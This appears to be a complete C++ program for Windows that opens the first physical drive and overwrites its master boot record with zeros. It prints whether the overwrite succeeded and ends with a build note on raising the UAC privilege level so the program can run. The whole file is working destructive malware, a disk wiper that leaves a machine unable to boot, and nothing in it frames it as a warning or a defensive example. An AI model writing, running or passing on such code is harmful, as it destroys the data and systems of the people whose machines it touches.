#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);

	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
		cout << "MBR is overwrite!";
		Sleep(3000);
		ExitProcess(0);
	}
	else {
		cout << "Fail to overwrite MBR";
		Sleep(3000);
		ExitProcess(0);
	}

	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;
}

// VS: Project Property > Linker > Manifest File > UAC Execution Level: highestAvaiable